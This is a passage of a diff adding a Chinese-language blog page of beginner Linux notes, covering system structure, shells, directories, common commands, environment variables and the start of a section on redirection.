@@ -1,0 +1,882 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title> - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="" />
+<meta property="og:description" content="Linux操作系统基础知识 Linux系统结构 内核 Shell 文件系统 应用程序 Linux操作系统内核 管理进程 管理内存 管理驱动 管理文件和网络 Linux Shell功" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Linux操作系统基础知识 Linux系统结构 内核 Shell 文件系统 应用程序 Linux操作系统内核 管理进程 管理内存 管理驱动 管理文件和网络 Linux Shell功"/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" /><link rel="prev" href="/linux%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E5%8F%8A%E8%A7%A3%E5%8E%8B%E7%BC%A9/" /><link rel="next" href="/kali%E5%85%B3%E9%97%AD%E9%94%81%E5%B1%8F/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\/"
+        },"genre": "posts","wordcount":  3019 ,
+        "url": "\/linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\/","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3019 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#linux系统结构">Linux系统结构</a>
+      <ul>
+        <li><a href="#linux操作系统内核">Linux操作系统内核</a></li>
+        <li><a href="#linux-shell">Linux Shell</a>
+          <ul>
+            <li><a href="#linux-shell工具">Linux Shell工具</a></li>
+          </ul>
+        </li>
+        <li><a href="#shell和terminal">Shell和Terminal</a></li>
+        <li><a href="#linux文件系统">Linux文件系统</a></li>
+        <li><a href="#linux目录">Linux目录</a></li>
+        <li><a href="#根目录文件">根目录文件</a></li>
+        <li><a href="#用户主目录">用户主目录</a></li>
+        <li><a href="#目录指代">目录指代</a></li>
+      </ul>
+    </li>
+    <li><a href="#linux常用操作">Linux常用操作</a>
+      <ul>
+        <li><a href="#命令帮助">命令帮助</a></li>
+        <li><a href="#关机重启root用户">关机重启(root用户)</a></li>
+        <li><a href="#快捷键和命令">快捷键和命令</a></li>
+        <li><a href="#别名配置alias">别名配置alias</a></li>
+        <li><a href="#通配符">通配符</a></li>
+        <li><a href="#系统环境变量">系统环境变量</a></li>
+      </ul>
+    </li>
+    <li><a href="#文件描述符和重定向">文件描述符和重定向</a>
+      <ul>
+        <li><a href="#文件描述符-file-descriptor">文件描述符 File Descriptor</a></li>
+        <li><a href="#重定向">重定向</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="linux操作系统基础知识" class="headerLink">
+    <a href="#linux%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="header-mark"></a>Linux操作系统基础知识</h1><h2 id="linux系统结构" class="headerLink">
+    <a href="#linux%e7%b3%bb%e7%bb%9f%e7%bb%93%e6%9e%84" class="header-mark"></a>Linux系统结构</h2><img src="https://pic.imgdb.cn/item/64a4bee11ddac507cc866c25.jpg" style="zoom:67%;" />
+<ol>
+<li>内核</li>
+<li>Shell</li>
+<li>文件系统</li>
+<li>应用程序</li>
+</ol>
+<h3 id="linux操作系统内核" class="headerLink">
+    <a href="#linux%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%86%85%e6%a0%b8" class="header-mark"></a>Linux操作系统内核</h3><ol>
+<li>管理进程</li>
+<li>管理内存</li>
+<li>管理驱动</li>
+<li>管理文件和网络</li>
+</ol>
+<h3 id="linux-shell" class="headerLink">
+    <a href="#linux-shell" class="header-mark"></a>Linux Shell</h3><p>功能：接收用户的命令，经过转换，交给内核执行</p>
+<blockquote>
+<p>cat   —&gt; open() read()</p>
+</blockquote>
+<p>优点：</p>
+<ul>
+<li>简化操作</li>
+<li>安全</li>
+</ul>
+<h4 id="linux-shell工具" class="headerLink">
+    <a href="#linux-shell%e5%b7%a5%e5%85%b7" class="header-mark"></a>Linux Shell工具</h4><table>
+<thead>
+<tr>
+<th>名称</th>
+<th>程序路径</th>
+<th style="text-align:center">作者</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bourne Shell</td>
+<td>/usr/bin/sh或/bin/sh</td>
+<td style="text-align:center">Stephen Bourne</td>
+</tr>
+<tr>
+<td>C Shell</td>
+<td>/usr/bin/csh</td>
+<td style="text-align:center">Bill Joy</td>
+</tr>
+<tr>
+<td>K Shell</td>
+<td>/usr/bin/ksh</td>
+<td style="text-align:center">David Korn</td>
+</tr>
+<tr>
+<td>Bourne Again Shell</td>
+<td>/bin/bash</td>
+<td style="text-align:center">Brian Fox</td>
+</tr>
+<tr>
+<td>Z Shell</td>
+<td>/bin/zsh或/usr/bin/zsh</td>
+<td style="text-align:center">Paul Falstad</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>Windows：cmd、Power Shell</p>
+</blockquote>
+<h3 id="shell和terminal" class="headerLink">
+    <a href="#shell%e5%92%8cterminal" class="header-mark"></a>Shell和Terminal</h3><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg" title="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg" data-thumbnail="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg"
+            srcset="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg, https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg 1.5x, https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64a4e0c21ddac507ccc5b805.jpg">
+    </a></figure></p>
+<h3 id="linux文件系统" class="headerLink">
+    <a href="#linux%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="header-mark"></a>Linux文件系统</h3><p><strong>“一切皆文件”</strong></p>
+<table>
+<thead>
+<tr>
+<th>查看文件</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>lsof /bin/bash</td>
+<td>查找某个文件相关的进程</td>
+</tr>
+<tr>
+<td>lsof -u root</td>
+<td>列出某个用户打开的文件信息</td>
+</tr>
+<tr>
+<td>lsof -c redis</td>
+<td>列出某个程序进程所打开的文件信息</td>
+</tr>
+<tr>
+<td>lsof -i tcp</td>
+<td>列出所有tcp 网络连接信息</td>
+</tr>
+<tr>
+<td>……</td>
+<td>……</td>
+</tr>
+</tbody>
+</table>
+<h3 id="linux目录" class="headerLink">
+    <a href="#linux%e7%9b%ae%e5%bd%95" class="header-mark"></a>Linux目录</h3><p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg" title="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg" data-thumbnail="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg"
+            srcset="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg, https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg 1.5x, https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64a4e2b61ddac507ccc939ec.jpg">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg" title="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg" data-thumbnail="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg"
+            srcset="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg, https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg 1.5x, https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64a4e2c21ddac507ccc94e54.jpg">
+    </a></figure></p>
+<h3 id="根目录文件" class="headerLink">
+    <a href="#%e6%a0%b9%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6" class="header-mark"></a>根目录文件</h3><table>
+<thead>
+<tr>
+<th>目录</th>
+<th>作用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bin</td>
+<td>存放普通用户可执行的指令</td>
+<td>即使在单用户模式下也能够执行处理</td>
+</tr>
+<tr>
+<td>boot</td>
+<td>开机引导目录</td>
+<td>包括Linux内核文件与开机所需要的文件</td>
+</tr>
+<tr>
+<td>dev</td>
+<td>设备目录</td>
+<td>所有的硬件设备及周边均放置在这个设备目录中</td>
+</tr>
+<tr>
+<td>etc</td>
+<td>各种配置文件目录</td>
+<td>大部分配置属性均存放在这里</td>
+</tr>
+<tr>
+<td>lib</td>
+<td>库文件存放地，bin和sbin需要的库文件</td>
+<td>类似Windows的DLL</td>
+</tr>
+<tr>
+<td>media</td>
+<td>可移除设备挂载目录</td>
+<td>类似U盘、光盘、移动硬盘等临时挂放目录</td>
+</tr>
+<tr>
+<td>mnt</td>
+<td>用户临时挂载其他的文件系统</td>
+<td>额外的设备可挂载在这里，相对临时而言</td>
+</tr>
+<tr>
+<td>opt</td>
+<td>第三方软件安装目录</td>
+<td>现在习惯性的放置在/usr/local中</td>
+</tr>
+<tr>
+<td>proc</td>
+<td>虚拟文件系统</td>
+<td>通常是内存中的映射，注意误删除数据文件的恢复</td>
+</tr>
+<tr>
+<td>root</td>
+<td>系统管理员主目录</td>
+<td>除root之外，其他用户均放置在/home目录下</td>
+</tr>
+<tr>
+<td>run</td>
+<td>系统运行时所需文件</td>
+<td>以前放在/var/run中，现在独立的/run目录</td>
+</tr>
+<tr>
+<td>sbin</td>
+<td>只有root才能运行的管理指令</td>
+<td>跟bin类似，但只属于root管理员</td>
+</tr>
+<tr>
+<td>srv</td>
+<td>服务启动后需要访问的数据目录</td>
+<td></td>
+</tr>
+<tr>
+<td>sys</td>
+<td>虚拟文件系统</td>
+<td>跟proc一样，记录核心系统硬件信息</td>
+</tr>
+<tr>
+<td>tmp</td>
+<td>存放临时文件目录</td>
+<td>所有用户对该目录均可读写</td>
+</tr>
+<tr>
+<td>usr</td>
+<td>应用程序放置目录</td>
+<td></td>
+</tr>
+<tr>
+<td>var</td>
+<td>存放系统执行过程经常改变的文件</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="用户主目录" class="headerLink">
+    <a href="#%e7%94%a8%e6%88%b7%e4%b8%bb%e7%9b%ae%e5%bd%95" class="header-mark"></a>用户主目录</h3><p>主目录：home directory</p>
+<p>root用户的主目录是 /root</p>
+<p>其他用户的主目录是 /home/用户名</p>
+<p>将当前工作目录更改为当前用户的主目录：<code>cd 空格</code> 或者 <code>cd ~</code></p>
+<p>工作目录：working directory</p>
+<h3 id="目录指代" class="headerLink">
+    <a href="#%e7%9b%ae%e5%bd%95%e6%8c%87%e4%bb%a3" class="header-mark"></a>目录指代</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>指代</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>绝对路径</td>
+<td>由根目录 / 开始写起</td>
+</tr>
+<tr>
+<td>相对路径</td>
+<td>从当前所在的工作目录开始写起</td>
+</tr>
+<tr>
+<td>/</td>
+<td>根目录</td>
+</tr>
+<tr>
+<td>.</td>
+<td>代表当前目录</td>
+</tr>
+<tr>
+<td>~</td>
+<td>代表用户工作目录，vim ~/.bashrc</td>
+</tr>
+<tr>
+<td>../</td>
+<td>代表上一级目录</td>
+</tr>
+<tr>
+<td>../../</td>
+<td>上上一级目录，以此类推，超出范围的时候代表根目录</td>
+</tr>
+</tbody>
+</table>
+<h2 id="linux常用操作" class="headerLink">
+    <a href="#linux%e5%b8%b8%e7%94%a8%e6%93%8d%e4%bd%9c" class="header-mark"></a>Linux常用操作</h2><h3 id="命令帮助" class="headerLink">
+    <a href="#%e5%91%bd%e4%bb%a4%e5%b8%ae%e5%8a%a9" class="header-mark"></a>命令帮助</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man command（manual）——具体参数和使用方法
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whatis command——命令的简要说明
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">info command——详细介绍
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">help command——Linux内置命令
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="关机重启root用户" class="headerLink">
+    <a href="#%e5%85%b3%e6%9c%ba%e9%87%8d%e5%90%afroot%e7%94%a8%e6%88%b7" class="header-mark"></a>关机重启(root用户)</h3><p>关机：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">poweroff
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shutdown -h now
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">halt -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>重启：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">reboot
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="快捷键和命令" class="headerLink">
+    <a href="#%e5%bf%ab%e6%8d%b7%e9%94%ae%e5%92%8c%e5%91%bd%e4%bb%a4" class="header-mark"></a>快捷键和命令</h3><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tab键</td>
+<td>补全命令和目录（自动提示）</td>
+</tr>
+<tr>
+<td>方向键</td>
+<td>上一条命令：↑；下一条命令：↓</td>
+</tr>
+<tr>
+<td>Ctrl + r</td>
+<td>搜索历史命令，回车执行</td>
+</tr>
+<tr>
+<td>!cd：</td>
+<td>重复执行最近一次以cd开头的历史命令</td>
+</tr>
+<tr>
+<td>Ctrl + Insert</td>
+<td>复制</td>
+</tr>
+<tr>
+<td>Shift + Insert</td>
+<td>粘贴</td>
+</tr>
+<tr>
+<td>Alt + Insert</td>
+<td>复制并粘贴</td>
+</tr>
+<tr>
+<td>Ctrl + E</td>
+<td>光标移动到行尾</td>
+</tr>
+<tr>
+<td>Ctrl + A</td>
+<td>光标移动到行首</td>
+</tr>
+<tr>
+<td>Ctrl + K</td>
+<td>清除光标后至行尾的内容</td>
+</tr>
+<tr>
+<td>Ctrl + U</td>
+<td>清除光标前至行首间的所有内容</td>
+</tr>
+<tr>
+<td>clear</td>
+<td>清屏，但是命令都还在</td>
+</tr>
+<tr>
+<td>history</td>
+<td>查看历史命令</td>
+</tr>
+<tr>
+<td>history -c</td>
+<td>清除历史命令</td>
+</tr>
+<tr>
+<td>kali：echo &gt; ~/.zsh_history</td>
+<td>清除历史命令（kali Linux）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="别名配置alias" class="headerLink">
+    <a href="#%e5%88%ab%e5%90%8d%e9%85%8d%e7%bd%aealias" class="header-mark"></a>别名配置alias</h3><p>查看别名：<code>alias</code></p>
+<p>设置别名（以bash为例）：<code>vim ~/.bashrc</code></p>
+<p>格式：<code>alias short='xxx;xxx'</code></p>
+<p>生效：<code>source ~/.bashrc</code></p>
+<h3 id="通配符" class="headerLink">
+    <a href="#%e9%80%9a%e9%85%8d%e7%ac%a6" class="header-mark"></a>通配符</h3><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>指代</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>*</td>
+<td>任意字符</td>
+</tr>
+<tr>
+<td>?</td>
+<td>单个字符</td>
+</tr>
+<tr>
+<td>[]</td>
+<td>匹配范围中的，比如[0-9][a-z]</td>
+</tr>
+<tr>
+<td>{}</td>
+<td>多个  ll {<em>.log,</em>.txt}</td>
+</tr>
+<tr>
+<td>^</td>
+<td>取反 ll*[^txt]* 查找不是.txt结尾</td>
+</tr>
+</tbody>
+</table>
+<h3 id="系统环境变量" class="headerLink">
+    <a href="#%e7%b3%bb%e7%bb%9f%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f" class="header-mark"></a>系统环境变量</h3><p>环境变量是操作系统或应用程序提供的一种机制，用于存储和访问各种配置信息和运行时参数。它们对于操作系统和应用程序的正常运行非常重要，具有以下作用：</p>
+<ol>
+<li>配置应用程序：环境变量可以设置应用程序的配置参数，例如数据库连接字符串、日志级别、系统路径等。通过修改环境变量，可以轻松更改应用程序的行为和设置。</li>
+<li>系统路径设置：环境变量中的&quot;PATH&quot;变量定义了系统在哪些目录中查找可执行文件。当你在命令行中输入一个命令时，操作系统会根据&quot;PATH&quot;环境变量的值来查找对应的可执行文件。这样，你可以在任何目录下直接运行系统中的命令。</li>
+<li>共享配置信息：环境变量可以用于共享配置信息和参数值。不同的应用程序可以使用相同的环境变量来获取共享的配置值，这样可以提高配置的一致性和可维护性。</li>
+<li>运行时参数传递：通过设置环境变量，可以在不修改代码的情况下传递运行时参数给应用程序。应用程序可以读取环境变量的值来确定其行为。</li>
+<li>系统定制化：环境变量允许用户对系统进行个性化定制。用户可以设置特定的环境变量来满足自己的需求，例如设置默认编辑器、语言环境、主题等。</li>
+</ol>
+<p>查看全部变量：<code>env</code></p>
+<p>查看单个变量：<code>echo $XXX</code></p>
+<p>用户变量：<code>~/.bashrc</code></p>
+<p>系统变量：<code>/etc/profile</code></p>
+<blockquote>
+<p>设置JDK环境变量</p>
+<p><code>vim /etc/profile</code></p>
+<p><code>export JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</code></p>
+<p><code>export PATH=$JAVA_HOME/bin:$PATH</code></p>
+<p><code>export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarsource /etc/profile</code></p>
+</blockquote>
+<h2 id="文件描述符和重定向" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6%e5%92%8c%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>文件描述符和重定向</h2><h3 id="文件描述符-file-descriptor" class="headerLink">
+    <a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6-file-descriptor" class="header-mark"></a>文件描述符 File Descriptor</h3><table>
+<thead>
+<tr>
+<th>ID</th>
+<th>描述</th>
+<th>设备</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>标准输⼊（stdin）</td>
+<td>键盘</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出（stdout）</td>
+<td>显示器</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误输出（stderr）</td>
+<td>显示器</td>
+</tr>
+</tbody>
+</table>
+<h3 id="重定向" class="headerLink">
+    <a href="#%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>重定向</h3><p>在Linux中，重定向是一种将命令的输入或输出从默认的位置进行修改的方式。通过重定向，你可以将命令的输入重定向自文件，或将命令的输出重定向到文件或其他位置。</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>类别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&gt;</td>
+<td>输出重定向（覆盖）</td>
+</tr>
+<tr>
+<td>&raquo;</td>
+<td>输出重定向（追加）</td>
+</tr>
+<tr>
+<td>2&gt;</td>
+<td>错误输出重定向</td>
+</tr>
+<tr>
+<td>&amp;&gt;</td>
+<td>标准输出和错误输出合并重定向</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>输入重定向</td>
+</tr>
+<tr>
+<td>&laquo;</td>
+<td>Here文档（Here Document）输入重定向</td>
+</tr>
+<tr>
+<td>|</td>
+<td>管道（pipe）</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li>
+<p>标准输出重定向（<code>&gt;</code>）：使用 <code>&gt;</code> 将命令的输出重定向到文件中，覆盖原有内容。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
